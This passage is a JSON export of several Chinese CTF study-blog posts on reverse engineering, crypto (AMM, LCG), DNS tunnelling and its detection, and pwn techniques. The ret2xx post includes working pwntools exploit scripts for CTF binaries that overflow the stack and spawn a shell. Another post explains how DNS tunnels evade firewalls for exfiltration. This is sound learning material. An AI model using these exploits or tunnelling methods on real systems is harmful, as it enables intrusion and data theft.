Paper","author_index":"S1eepy"},{"id":"55fb07a4dbf6f44614d26c9d54b2e72f","title":"二进制","content":"写在前面HWS运气好打进了线下，就补习一下前两年的夏令营知识，刚好用来入门RE和PWN，本分类就用于记一些笔记\n另外下面的逆向工程这一块没什么用全是misc入门知识，但是既然写了也懒得删，就留着吧\n加密与解密流密码随机数预测爆破知道随机数产生的内容，预测次数比较少，精度比较低，可以爆破，以时间为单位\nrandom.seed(int(time.time()))\n\n线性伪随机生成器(java.util.Random, c rand(), php rand())\n在知道系数的情况下，至少知道两个state和对应的output即可爆破出当前的state\nMersenne Twister rand(Ruby rand(), python rand(), PHP mt_rand())与上state类似，但是是以624个state为一组生成下一组624个state\nstate生成output算法也不同，但仍旧全是线性变换，具体如下\ncurrentIndex++;\nint tmp = state[currentIndex];\ntmp ^= (tmp &gt;&gt;&gt; 11);\ntmp ^= (tmp &lt;&lt; 7) &amp; 0x9d2c5680;\ntmp ^= (tmp &lt;&lt; 15) &amp; 0xefc60000;\ntmp ^= (tmp &gt;&gt;&gt; 18);\nreturn tmp;\n\n通过624个output组，逆推回624个state，然后就可以正向计算\n公钥密码RSA这块用的比较多，回头有空更到crypto里\n模数分解、公约数模数分解、共模攻击、选择密文攻击、小指数爆破、LLL格集规约、维纳攻击、广播攻击\n区块链这块懒得看了、着实不感兴趣(主要是在学校上课的时候没认真听，就懒得补了，希望以后接触不到)、主要是智能合约部分的内容\n逆向工程识别加密算法常规的有base64、TEA、AES、RC4、MD5\n脚本语言逆向解释型语言与字节码一一对应，这些语言逆向出来的可读性比较强\n\npeid查壳\n.Net反编译 - DNSSPY - 例题crackme\nDe4dot去混淆\n\npython逆向\npyc逆向 - https://tool.lu/pyc/\npy2exe逆向 - https://github.com/matiasb/unpy2exe\npyInstaller逆向 - https://github.com/Ravensss/pyinstxtractor\n\n注意从exe提取出的pyc是没有文件头的，需要手动补上\n密码学基础和编码看完发现这一块是misc，也不写了，记得一部分也不删了留着吧，回头更misc笔记的时候再补到那边\n密码：古典密码、分组密码、序列密码、公钥密码\n编码：hex、base家族、XXencode、UUencode、Shellcode编码、morse电码\n特别的：曲路密码、云影密码、栅栏密码、替代密码、培根密码、猪圈密码、仿射密码、多表替代\n病毒分析壳与脱壳把自身(壳)代码附加到保护对象上，操作系统在执行时壳会先获取到控制权，去壳后将控制权交给主程序\n\n\n\n\n\n\n\n\n\n分类：压缩壳(upx、ASPack)、加密壳(VMProtect、ASProtect、Themida、EXECryptor、Safengine，特点是指令虚拟化)\n\n\n\n\n\n\n\n\n\n脱壳：工具脱壳、手动脱壳\nPE文件格式学习Stud_PE用于学习、CFF_Explorer优秀的PE编辑工具、010editor\n查壳工具PEiD比较古老、Exeinfo PE功能齐全\n壳的加载过程壳需要比程序代码更早的获取控制权，但是不影响程序正常功能，需要模拟PE加载器的过程，步骤主要如下\n\n入口现场保存：pushad进行现场保存，主要保存是寄存器内存放的一些操作系统预先填充好的值，主要是通过压栈实现\n获取壳自身解密程序所需API的地址：外壳的输入表中的函数比较少，需要通过GetProcAddress等函数获取其他函数的API，用于后续解密\n解密源程序各个区块的数据：壳是按区块进行加密的，此处也按区块顺序进行解密\n初始化IAT，导入源程序所需系统API的地址：动态链接库的调用需要一张导入地址表(IAT)，程序被PE加载器加载之后，PE加载器需要填充IAT\n调整重定位项：对于基地址动态变化的程序以及DLL来说，重定位是必不可少的\nHook API，实现一些保护功能（可选）\n恢复入口线程，跳转至OEP（原入口点），控制权转交：popad进行现场恢复\n\n寻找OEP\n根据跨段指令寻找OEP：大多数加壳程序会在被加密程序中加上一个或多个段，在最后跳转至OEP时是通过一个跨段跳转指令进行转移，可以根据跨段转移指令(远JMP等)找到入口点，一般会有popad/popfd的出现\n根据栈平衡原理找OEP：壳段代码保存现场后，对ESP指向的内存单元下硬件访问断点，那么壳段代码恢复现场时会访问这个单元，此时EIP所处的位置处于壳段代码末位，距离跳转至OEP也不远了\n用内存断点找OEP：下执行断点\n\nDump内存找到OEP之后，需要将进程的内存镜像通过某种方式dump下来，就可以进行静态分析了\n原理：调用API Module32Next来获取进程的基本模块信息\n工具：x32dbg里有Scylla\nIAT修复直接dump出来的程序无法直接运行，缺少了必要信息，PE加载器无法填充IAT，所以动态链接库的调用无法正确寻址\n修复：重建INT（工具、手工）\n\n\n\n\n\n\n\n\n\nIAT与INT：IAT是通过INT进行索引填充的，所以本质上是修复INT等内容\n工具：ImportREConstructor、Scylla\n反调试技术\n利用进程在调试和未调试状态的差异实现反调试：Windows中调试中的进程PEB的BeingDebugged字段会被设置为True\n利用调试器原理实现反调试：普通调试器会对内存进行修改实现软件断点\n利用操作系统下的API特性实现反调试：在Linux系统下，调用ptrace，是的当前进程处于其父进程的跟踪状态下\n\nSMC动态加解密技术Self-Modifying Code，指会修改自身的代码，根据出现时机可以分为两种\n\n\n\n\n\n\n\n\n\n1.仅初始化时修改（各种压缩壳）\n2.贯穿控制流的修改（各种动态解密、shellcode等）\n例题天津该 这题认真写一写回头，最近真的没时间了，下次当复习吧\n花指令的识别与去除花指令用于干扰反汇编器，是指在代码中完全冗余、不影响程序功能的代码段，但是会干扰逆向工程\n例子pushfd\nadd esp 0xd\nnop\nsub esp 0xd\npopfd\n\n更高级的静态混淆手段加入无用且能干扰线性扫描反汇编器的指令序列\njmp addr1\ndb 0xe8\naddr1:\n\n能干扰ida这种递归扫描反汇编器的混淆\ncmp ***\njne label\nje label\n***\nlabel:\n\n乱序插入各种jmp指令乱跳\n变形将一条指令转换成好几条指令，效果相同\nretn &lt;=&gt; \npush ecx\nmov ecx, [esp+4]\nadd esp, 8\njmp ecx\n\njmp proc &lt;=&gt; \npush &amp;proc\nretn\n\n控制流平坦化将程序控制流进行平坦化，简单来说就是改变了程序的执行流程，让流程更复杂了\n\n\n\n\n\n\n\n\n\n基本块：会引起程序分支(跳转)的地方切一刀，分开的程序块就是基本块\n一般有工具\n虚拟机保护VMProtect除了提供常规的数据、代码加密以及反调试之外，还能在汇编指令层面对逻辑进行虚拟化，即将开发者指定的代码段中的所有汇编指令转化成自行编写的一套指令集中的指令，并在实际执行时由自行编写的虚拟机执行器进行模拟执行\npintoolstrace出整个VM中所有的指令，对各个指令干什么事情进行化简，将虚拟字节码尽可能还原成CPU的指令\npaper：VMhunt\n","slug":"HWS/2020/二进制","date":"2022-02-02T11:23:08.000Z","categories_index":"HWS/2020","tags_index":"HWS","author_index":"S1eepy"},{"id":"0f98a03e2be0fa66aad63599b5ae90ad","title":"高次剩余求解","content":"\n\n高次剩余求解最近遇到了一个新的高次剩余求解的题目，学到了一个叫AMM的算法来求解，记录一下，顺便回头有空了补一下二次剩余的(挖坑ing)，已经忘了差不多了\n推导过程懒得看了，直接贴上论文的求解过程\n\n然后求解代码如下(代码来自智慧与美貌并存的好哥哥曲映曦师傅)，其中x是，e是r，p是q\nimport random\nimport math\nimport libnum\nimport time\nfrom Crypto.Util.number import bytes_to_long,long_to_bytes\np = 0\ndef GF(a):\n    global p\n    p = a\ndef g(a,b):\n    global p\n    return pow(a,b,p)\ndef AMM(x,e,p):\n    GF(p)\n    y = random.randint(1, p-1)\n    while g(y, (p-1)//e) == 1:\n        y = random.randint(1, p-1)\n        print(y)\n    print(\"find\")\n    #p-1 = e^t*s\n    t = 1\n    s = 0\n    while p % e == 0:\n        t += 1\n        print(t)\n    s = p // (e**t)\n    # print('e',e)\n    # print('p',p)\n    # print('s',s)\n    # print('t',t)\n    # s|ralpha-1\n    k = 1    \n    while((s * k + 1) % e != 0):\n        k += 1\n    alpha = (s * k + 1) // e\n   \n    a = g(y, (e ** (t - 1) ) * s)\n    b = g(x, e * alpha - 1)\n    c = g(y, s)\n    h = 1\n    #\n    for i in range(1, t-1):\n        print('cur_i',i)\n        d = g(b,e**(t-1-i))\n        if d == 1:\n            j = 0\n        else:\n            j = (-math.log(d,a) % e)\n        b = b * (g(g(c, e), j))\n        h = h * g(c, j)\n        c = g(c,e)\n    return (g(x,alpha * h)) % p\n\n","slug":"CTF/crypto/高次剩余求解","date":"2022-01-23T10:05:35.000Z","categories_index":"CTF/CRYPTO","tags_index":"CTF CRYPTO","author_index":"S1eepy"},{"id":"6cbb80cb79ca010921d708bc73e8460f","title":"Hexo主题数学公式渲染","content":"\n\nHexo主题数学公式渲染之前搭博客的时候内嵌数学公式一直没渲染出来，一大堆$$符号放着十分的呆，很多博客让卸了装好多包最后也没解决，这次放一下我的解决办法\n首先hexo的框架应该都是支持mathjax的，只不过不同主题开启方式不同\n首先需要安装majax插件\nnpm install hexo-filter-mathjax --save\n\n然后我的是Aurora主题，在文章开头加上\nmathjax: true\n\n成功解决\n","slug":"blog/Hexo主题数学公式渲染","date":"2022-01-23T08:21:01.000Z","categories_index":"BLOG","tags_index":"BLOG","author_index":"S1eepy"},{"id":"03ede3be90a360cf1806307a54bd7512","title":"随机数之LCG","content":"\n\n随机数之LCG上课的时候好像学过LCG这个东西，但是遇到的时候想都想不起来..所以还是写点东西记下来\n定义和推广线性同余法(LCG)是一种伪随机数生成的方法，生成方法如下其中定义了三个整数，乘数a、增量b、模数m\n推广公式根据定义推出三个数的求法如下另一个很重要的公式单独列出来设有即\n例题给出一个例题如下，求出乘数A、增量B、模数q\ns0 = 543263588863771657634119\ns1 = 628899245716105951093835\ns2 = 78708024695487418261582\ns3 = 598971435111109998816796\ns4 = 789474285039501272453373\n\nassert ( A * s0 + B ) % q == s1\nassert ( A * s1 + B ) % q == s2\nassert ( A * s2 + B ) % q == s3\nassert ( A * s3 + B ) % q == s4\n\n解题脚本如下\nfrom Crypto.Util.number import *\ndef gcd(a,b): \n    if(b==0): \n        return a \n    else: \n        return gcd(b,a%b) \ns =  [543263588863771657634119, 628899245716105951093835, 78708024695487418261582, 598971435111109998816796, 789474285039501272453373]\nt = []\nfor i in range(5):\n    t.append(s[i]-s[i-1]) \nall_n = []\nfor i in range(3):\n    all_n.append(gcd((t[i+1]*t[i-1]-t[i]*t[i]), (t[i+2]*t[i]-t[i+1]*t[i+1]))) \n\nMMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #逆元计算\nfor n in all_n:\n    n=abs(n)\n    if n==1:\n        continue\n    a=(s[2]-s[1])*MMI((s[1]-s[0]),n)%n\n    ani=MMI(a,n)\n    b=(s[1]-a*s[0])%n\n    print(a, b, n)\n\n","slug":"CTF/crypto/随机数之LCG","date":"2022-01-23T07:02:13.000Z","categories_index":"CTF/CRYPTO","tags_index":"CTF CRYPTO","author_index":"S1eepy"},{"id":"31531518f5b44460dcc99773a48a9a22","title":"DNS隧道文献调研","content":"\n\nDNS隧道文献调研前两天学习了点DNS隧道的知识，这两天就调研了一下DNS隧道的检测相关手段，主要涉及人工智能和流量检测的\n低速DNS隐蔽信道通信检测研究与实现研究现状检测思路主要分为两类\n\n\n\n\n\n\n\n\n\n基于通信过程特征：深度学习（基于字节的卷积神经网络，基于长短期记忆的循环神经网络，Stacking的方法）\n\n\n\n\n\n\n\n\n\n基于通信内容特征：子域名（随机森林机器学习）、基于异常检测的机器学习模型\n主要工作针对一般DNS隐蔽信道通信，提出了结合通信过程特征和通信内容特征的两阶段模型检测方案，时延低，检测效果更优\n针对低速单域名DNS隐蔽信道通信和低速多域名DNS隐蔽信道通信，在之前研究成果的基础上提出了解决方案\n在提出的检测方案之上，根据环境实际需求，实现了DNS隐蔽信道通信检测系统\n数据集对活跃的开源DNS隐蔽信道工具出发，搭建实际环境进行数据收集\n对五种DNS隐蔽信道工具进行收集，包括Iodine、DNScat2、DNSteal、DNS2TCP和Glimpse。\n在DNS流量监控体系统以及校园网网关手机了DNS流量白样本。\n数据集大小为98008700条，其中165000条黑样本，9635970条白样本\n训练集，测试集和验证集占比为70%，15%，15%\n技术要点\n\n\n\n\n\n\n\n\n异常检测：对不符合预期的观测值进行识别，异常分为三类，单点异常，上下文异常，集体异常\n\n\n\n\n\n\n\n\n\n孤立森林算法：是异常检测领域的重要算法之一，利用了异常数据的两个定量特性，一是异常数据点量少且占比小，二是异常点的属性值与普通点的属性值有很大不同。孤立森林为数据集构建了一个“孤立树”(iTree)的组合，异常时在iTree上具有较短平均路径长度的点\n网络隐蔽信道检测关键技术研究这个不光是DNS隧道，好像还研究了其他隧道\n主要工作隐蔽信道检测全分类和关联分析\n提出一种基于集成检测的隐蔽信道盲信道检测方法\n提出一种基于迁移学习的APT隐蔽信道识别技术\n数据集\n\n\n序号\n内容\n介绍\n\n\n\n1\n隐蔽信道开源工具+匹配环境噪音\n开源数据集自主可控，环境噪音闭合形成搭配的隐蔽信道测试应用环境\n\n\n2\n僵尸网络C&amp;C数据集\n僵尸网络作者为保证僵尸网络的存活概率，其通信经过精心设计\n\n\n3\n隐蔽信道红队工具\n在攻防对抗中红队为规避审计方的防御才用的隐蔽攻击手段（与1有重复）\n\n\n4\n正常流量\n正常数据流量作为参考对比\n\n\n技术要点集成检测、迁移学习\n基于深度学习的DNS隐蔽隧道检测研究主要工作针对单个DNS请求识别DNS隧道攻击的问题，提出了基于神经网络的DNS隧道检测方案\n以优化提升检测效果为目的，提出使用多模型融合方案和基于生成对抗网络的优化策略，并进一步从攻击者角度出发，提升模型应对DNS隧道变种的能力，实现识别基于单词变换的DNS隧道变种。\n从实际出发，实现了基于深度学习的攻击检测平台\n数据集Alexa之前公开的域名数据集，获得772331白样本\n从github上收集了10000条DNS隧道数据，包含了iodine、powercat、keyoka、ozymandns等四种DNS隧道数据\n建立DNS隧道仿真环境进行数据采集，收集了323311条DNS隧道数据\n技术要点\n\n\n\n\n\n\n\n\n基于神经网络的DNS隧道检测方案：1.数据预处理 2.构建多种神经网络模型，实现基于神经网络的DNS隧道检测模型 3.建立检验模型的综合验证方法\n\n\n\n\n\n\n\n\n\nDNS隧道检测优化方案：1. 使用多模型融合方案，提高检测效果 2.使用基于GAN的优化策略，生成对抗网络，提高检测能力\n\n\n\n\n\n\n\n\n\n设计了一个大数据DNS隧道检测系统平台：1.DNS隧道攻击仿真环境 2.大数据环境下网络安全分析数据提取 3.数据持久化存储 4.元数据可视化分析监控 5.深度学习算法基础平台\nDNS隐蔽信道异常行为检测系统的设计与实现主要工作针对现有研究方法忽略了DNS响应消息而导致漏报的问题，提出了基于流量的DNS隐蔽信道异常行为监测方案\n为了对模型识别出的异常DNS隐蔽信道数据作进一步的威胁类型判断，本文建立规则库并采取多协议样本分析的方法构建了威胁类型判定体系。\n为了更好地满足交互式检测DNS隐蔽信道异常行为的市场需求，本文设计并实现了DNS隐蔽信道异常行为检测系统。\n数据集使用四种隐蔽信道工具和一种恶意软件模拟DNS隐蔽信道通信，使用wireshark抓包\n\n\n\n样本类别\n数量(条)\n\n\n\n正常DNS流量\n10000\n\n\niodine\n4000\n\n\ndnsteal\n500\n\n\ndnscat2\n4000\n\n\ndns2tcp\n500\n\n\nGlimpse\n1000\n\n\n技术要点基于规则的检测、基于机器学习的检测\n","slug":"Research/Paper/DNS隧道文献调研","date":"2022-01-22T03:50:03.000Z","categories_index":"Research/Paper","tags_index":"Research Paper","author_index":"S1eepy"},{"id":"c96bc3988ac1e521f9bca4fae6eb257f","title":"初探DNS隧道","content":"\n\n初探DNS隧道本文主要探究一下DNS协议，隐蔽信道实现原理，以及一些相关工具等\n从DNS协议说起域名系统(Domain Name System，DNS)是一种将域名和IP地址进行互相映射的一个分布式数据库，使用户能方便的直接通过域名访问互联网服务，而不需要去记一大串IP。通过主机名最终得到该IP地址的过程叫做域名解析。\nDNS协议是一种为其他应用层协议服务的一个应用层协议，比如HTTP、SMTP、FTP等，主要就是将这些域名解析为IP地址。DNS协议主要基于\n域名系统域名系统具有唯一性，命名采用层次结构，比如www.baidu.com这个域名：com是顶级域名，baidu是二级域名，www是三级域名。\n域名解析域名解析就是将域名映射到IP地址的过程，进行DNS解析时使用的通常是UDP协议，但是在主服务器向备份服务器同步数据的时候使用的是TCP协议，DNS协议使用的端口号是53。\n1.递归查询主机向本地域名服务器发送请求，然后等待最终结果即可，本地域名服务器若未查询到对应IP，会作为DNS客户端向其他域名服务器查询，直到找到对应IP。\n2.迭代查询主机向本地域名服务器发送请求，然后等待最终结果。本地域名服务器会直接向根域名服务器发起域名查询请求，根域名服务器告诉本地域名服务器下一个要查询的DNS服务器的IP地址，然后本地域名服务器再去对应IP查询，直到获取到最终的IP地址。\nDNS隐蔽信道为什么要用隐蔽通道在复杂或者相对安全的网络环境中，防守方对于内部网络出去的流量是有严格管控的，一般会通过防火墙来实现，因此攻击者拿到内网主机的权限后想要进行持久控制是比较困难的，因为一些敏感操作（比如命令执行、数据外带等等）会触发防火墙或者安全设备的规则。因此通过DNS隐蔽隧道可以在不被防火墙检测的情况下进行命令执行或者数据外带，从而实现长期控制。\n基本原理攻击者使用DNS报文的请求和响应消息作为传输数据的通信载体，来实现隐蔽通信。首先攻击者需要控制某个域名的域名解析服务器，让对某个域名的解析全都发送到该已经被控制的服务器上。最终在控制端和受控机器之间就成功建立起了一条隐蔽通信的通道。\n隐蔽信道的维护和通信都依赖于DNS查询请求和响应消息。由于目前DNS是互联网中不可缺少的服务，且主流的防火墙都没有设置过滤DNS流量的服务，因此使用DNS隧道能做到穿透防火墙。\nDNS隐蔽信道类型按照实现方式可以分为两类：\n\n\n\n\n\n\n\n\n\n1.直连信道：客户端直接与控制的DNS服务器进行连接，使用DNS协议封装要传输的数据，利用DNS请求与响应实现两者的通信。优点是十分高效，缺点是隐蔽性较弱，容易被探测到然后阻断。\n\n\n\n\n\n\n\n\n\n2.中继信道：利用DNS迭代查询实现，比直连更加隐蔽也更容易成功部署。但是由于需要多次跳转，因此效率比较低。\n实现DNS隐蔽信道需要注意一下几点：\n\n规避DNS缓存机制\n可以将DNS的请求域和响应域以及查询类型来作为信息载体\n由于域名系统采用CS机制，因此Server端不会主动发起连接请求，而是Client端定时向Server发送请求以保持通信\n\nDNS隐蔽信道工具\n\n\n工具\n说明\n\n\n\ndns2tcp\n支持直连模式，效率较低\n\n\ndnscat2\n可实现数据传输、文件操作等命令和控制功能。支持直连和中继两种模式\n\n\nIodine\n支持直连和中继两种模式，在编码、请求类型上提供了更丰富的选择，速度较快\n\n\nOzymandns\n结合ssh做文件传输。请求类型是TXT，使用base32编码，响应用base64编码\n\n\ndnsShell\n支持直连和中继两种模式\n\n\nreverseDnsShell\n基于直接连接的DNS信道木马\n\n\nDNS检测基于规则检测基于规则检测又分为两种：字符串匹配检测、基于特征检测\n前者比较准确，短时间内十分有效，不过长时间后若攻击者更改攻击方式，则可能会逃逸检测\n后者时效性更强，不过可能产生误报\nBotDAD统计分析了15种DNS行为特征\n\n\n\n序号\nDNS特征\n描述\n\n\n\n1\n每小时DNS请求的数量\n受感染的僵尸主机每小时的请求数量往往高于正常主机。\n\n\np2\n每小时不同的DNS请求数\n感染DGA恶意软件的主机往往比普通主机具有更多不同的请求。\n\n\np3\n单个域的最大请求数\n帮助检测DNS隧道，敏感信息通过DNS协议传输。\n\n\np4\n每分钟平均请求数\n用于检测受恶意软件感染的计算机，该计算机不使用短暂的DNS请求，而是使用休眠间隔定期对DNS请求做出贡献。                 它的计算方法是将主机发送的请求数除以主机处于活动状态并使用DNS服务的持续时间。\n\n\np5\n每分钟最多请求数\n帮助检测感染恶意软件的僵尸程序，这些恶意软件使用短暂的DNS请求通过域生成算法生成的多个URL与C＆C服务器进行通信。\n\n\np6\nMX记录查询数\n是网络中基于垃圾邮件的僵尸网络的强有力指标。\n\n\np7\nPTR记录（从ip地址到域名的一条记录）查询数\n有助于检测网络中存在异常行为的主机以及可能的感染。\n\n\np8\n查询的不同DNS服务器的数量\n有助于检测网络中具有异常行为的机器，因为标准系统查询多个DNS服务器的情况并不常见。TLD: top level domain，顶级域名SLD: second level domain，二级域名\n\n\np9\n不同TLD请求的数量\n在检测基于DGA的机器人方面非常有效，这些机器人不仅生成具有不同二级域的随机域，还生成具有不同顶级域名的随机域。\n\n\np10\n不同SLD请求的数量\n是网络中存在基于DGA的机器人的强烈指示。\n\n\np11\n唯一性比率\n是在主机每小时发送至少1000个请求的假设下，发送的请求数与发送的不同请求数之比。\n\n\np12\nFailed/NXDOMAIN请求的数量\n是网络中主机感染的一个非常强的指标。它通过主机维护响应代码等于DNS_RCODE_NXDOMAIN的响应数。\n\n\np13\n已解析IP地址的不同城市数量\n是一个强烈的异常指标，尤其是当IP地址分布在各个城市时。使用Maxmind数据库（“Geo2 Databases | MaxMi，2017”）获得城市映射的IP地址。\n\n\np14\n已经解析的ip地址的不同国家数量\n\n\n\np15\nFlux ratio\n在主机发送至少100个查询并且已收到至少100个响应的条件下，发送的不同请求与解析的不同ip地址的比率。\n\n\n基于机器学习检测分为两种，一种是自然语言处理，一种是统计机器学习\n参考文献孙鹿丽. DNS隐蔽信道异常行为检测系统的设计与实现[D].北京邮电大学,2021.DOI:10.26969/d.cnki.gbydu.2021.001579.\nhttps://www.freebuf.com/articles/database/210250.html\n","slug":"CTF/web/初探DNS隧道","date":"2022-01-20T04:34:19.000Z","categories_index":"CTF/WEB","tags_index":"CTF WEB","author_index":"S1eepy"},{"id":"4773296421a8fb9509157a21ee5da267","title":"栈溢出进阶","content":"\n\n栈溢出进阶stack smash在glibc-2.23可行，后续版本不可行了\n在报错时会泄漏出文件名，原码中的__fortify_fail里有个__libc_massgae将命令行输入参数作为调试结果输出了，因此可以用这个命令行的参数进行格式化字符串输出，将我们想要的libc地址，然后可以将flag读入内存然后用格式化字符串输出\nwdb2018_guess多线程下爆破创建新进程时父进程的地址空间中的内容给子进程，调用fork后子进程与父进程的执行顺序是无法确定的，子进程无法通过fork创建子进程\nfork有三种返回值：父进程中fork返回子进程的ID，子进程中fork返回0，出现错误fork返回负值\n通过子进程的输出来逐位爆破canary\nstack pivot","slug":"CTF/pwn/栈溢出进阶","date":"2022-01-20T01:17:23.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"e75c21f70c678b134f6a0bde8c339180","title":"ret2xx","content":"\n\nret2xx什么是ret2xx泛指ret2text，ret2shellcode，ret2syscall，ret2libc，ret2csu，其中ret2是return to的谐音，可以使用利用eip指针的方法来获取权限\nROPReturn Oriented Programming\nROP指通过修改Gadgets的ret结尾的指令顺序来实施攻击，需要如下条件：\n1.程序存在栈溢出，能控制返回地址\n2.可以找到满足条件的gadgets，而且知道gadgets的地址\nret2text对.text节的利用，会使用程序中已有的代码来进行攻击\n\n\n\n\n\n\n\n\n\n进程存在危险函数如system(“/bin”)或execv(“/bin/sh”,0,0)的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。\n例题jarvisoj_level2首先找system函数的地址和/bin/sh字符串的地址\n\n\n构造思路如下，先用0x88把缓冲区沾满，然后用0x4把ebp占满，然后修改返回地址为system(“/bin/sh”)即system的函数地址加上/bin/sh的地址，脚本编写时可以用pwntools的ELF模块\nfrom pwn import *\nelf = ELF(\"level2\")\np = remote(\"node4.buuoj.cn\", 28053)\n\np.recvuntil(\"Input:\\n\")\n\npayload = b'a' * 0x88 + b'b' * 0x4 + p32(0x08048320) + p32(0x0) + p32(0x804A024)\n# payload分为五部分\n# 第一块0x88个a填充栈到溢出\n# 第二块0x4个b填充ebp\n# 第三块为system函数地址\n# 第四块为system的返回地址(随便填任意值就行，不然会EOF)\n# 第五块为/bin/sh的地址指针\np.send(payload)\n\np.interactive()\n\n例题jarvisoj_level2_x64成因和32位的一样，区别在于64位函数在调用传参时先试用寄存器(依次为rdi,rsi,rdx,rcx,r8,r9)，那么我们将rdi指向/bin/sh即可\n设置rdi的方法是使用pop rdi; ret代码片段，用ropgagdet可以找\nret2shellcode控制程序来执行shellcode代码，一般而言shellcode需要我们自己填充\n例题jarvisoj_level1首先题目会泄漏buf的首地址，也就是我们每次都可以知道buf的地址，只要能将buf的返回地址改成我们需要的shellcode即可，然后将shellcode的返回地址改为buf的地址（至于为什么我也不知道，明天问一问）\nfrom pwn import *\ncontext(os='linux', arch='i386')\nfilepath = './level1'\n\n# p = process(filepath)\np = remote(\"node4.buuoj.cn\", 26859)\np.recvuntil(\"What's this:\")\nbuf = int(p.recv(10), 16)\n\nshellcode = asm(shellcraft.sh())\npayload = shellcode\npayload = payload.ljust(0x88+4,b'a')+p32(buf)\n# 最后一处的buf是作为shellcode的返回地址的\n# 所以为什么要这样做呢。。\np.send(payload)\np.interactive()\n\n\n\nret2syscall控制程序执行系统调用获取shell\n前提是系统存在0x80等中断类似触发系统调用的情况\n\n\n\n\n\n\n\n\n\n用户进程在执行系统调用前，先把系统调用名（实际上是系统调用号）、输入参数等放到寄存器上(EBX,ECX等寄存器)然后发出int 0x80指令，即触发xxx号中断系统暂停用户进程，根据xxx号中断找到中断服务程序，这个程序名就叫system_call()system_call()接着执行。它会从寄存器中找到系统调用名、输入参数等，并根据系统调用上下文中找到引发系统调用的进程；执行完毕后它又会把输出结果放到寄存器中。系统恢复用户进程，进程从寄存器中取到自己想要的东西，然后继续执行。\n例题inndy_ropret2libc控制函数执行libc中的函数，通常是返回某个函数的plt或者函数的具体位置，一般情况下，我们会选择执行system(“/bin/sh”)，故而此时我们需要知道system函数的地址\n\n\n\n\n\n\n\n\n\n补一下plt的概念：GOT和PLT都是一种重定向方式，比如printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。只有进程运运行后，printf函数的地址才能确定。\n\n\n\n\n\n\n\n\n\nlibc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。这个库可以根据 头文件划分为 15  个部分，其中包括：字符类型 ()、错误码()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 ()\n因此libc存放的都是使用过的函数或者字符串，查询libc可以使用ldd[文件名查询libc文件]\n例题jarvisoj_level1ret2csu\n\n\n\n\n\n\n\n\n在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候我们很难找到每一个寄存器对应的gadgets，这时候，我们可以利用x64下的 __libc_csu_init 中的 gadgets，这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在\n也就是说，其实 ret2csu和利用libc的思路一样，都是包含的指令来达到目标\n例题level5推荐阅读https://zhuanlan.zhihu.com/p/362737337\n","slug":"CTF/pwn/ret2xx","date":"2022-01-18T11:55:26.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"5cbed18fc0178c7e2f7d933895162e2e","title":"canary_pie绕过","content":"\n\nCanary_pie绕过Canary机制介绍canary是一种用来防护栈溢出的保护机制，原理是先在函数的入口处，从fs/gs寄存器中取出一个4字节或者8字节的值存到栈上，当程序结束后再检查这个值是否和存进去的值一致\nCanary bypass只要保持canary值不变，依旧可以修改eip的值\n格式化字符串绕过canary通过格式化字符串读取canary的值\n格式化字符串C语言的printf函数一般是这么用printf(“%s”, str);这时str的内容就会被打印出来，%s就是所说的格式化字符串，将变量中的内容按照格式化字符串的规定打印出来，由于%s判断字符串结束的依据是结尾的\\x00，因此可以把输入和canary连接在一起，将canary一起打印出来。需要注意的是canary的最后一位一定时\\x00，用于防止连带输出，所以我们改的时候要把canary的最后一位也改了\n例题canary bypass\ncanary爆破程序中必须有fork函数，不断自我复制，我们可以逐位爆破，若报错则说明这一位不对，若可以接着跑下一位就能一直跑最后得出正确的canary\nStack smashing故意触发canary_ssp leak\n劫持__stack_chk_fail通过程序中的其他函数，修改got表中的__stack_chk_fail函数地址，在栈溢出后执行该函数，然后就会跳到我们想要执行的函数\nPIE机制介绍PIE是一个针对代码段(.text)，数据段(.data)，未初始化全局变量段(.bss)等固定地址的一个防护技术，如果程序开启了PIE保护，那么每次程序加载的时候都会变换加载地址，从而不能通过ROPgadget等工具解题\nPIE bypass对于开启了PIE保护的程序，所有代码段的地址都只有最后三个数是已知的，而程序加载地址一般都是以内存页为单位的，所以程序的基地址最后三个数字一定是0，也就是那些地址已知的最后三个数就是实际地址的最后三个数。根据此，虽然我们没有完整地址，但是只要我们指导最后三个数，就可以利用栈上已有的地址，只修改最后两个字节，即可绕过。\n对于绕过PIE保护的核心思想就是partial writing\n例题","slug":"CTF/pwn/canary_pie绕过","date":"2022-01-18T11:53:50.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"ce6a61e69eea25b26a44cdf9f84d23a7","title":"RE-BUU","content":"\n\nBUUCTF-Reverse刷题记录新年快乐一个upx壳，怎么看出来的还不知道，等回头学会了再补\n直接upx -d去壳，扔进idaF5看代码就是比较输入字符串和”HappyNewYear!”，因此这个字符串就是flag\nxor主函数是逻辑如下，遍历输入字符串，将当前位与前一位异或，最终得到新字符串，将新字符串与global字符串比较，因此global就是异或后的结果，将其倒过来重新异或一遍即可。\n在IDA里双击global找到结果字符串（直接看长度不太对，再点进去一次），就能找到global的值，exp如下，注意去掉最后的f（懒得写进去了）\ns = ['f', 0xa, 'k', 0xc, 'w', '&amp;', 'O', '.', '@', 0x11, 'x', 0xd, 'Z', ';', 'U', 0x11, 'p', 0x19, 'F', 0x1F, 'v', '\"', 'M', '#', 'D', 0xe, 'g', 6, 'h', 0xf, 'G', '2', 'O']\nprint(len(s))\nflag = 'f'\nfor i in range(33):\n\tif isinstance(s[i], int):\n\t\ts[i] = chr(s[i])\n\nfor i in range(32, 0, -1):\n\tflag += chr(ord(s[i - 1]) ^ ord(s[i]))\nprint(flag[0] + 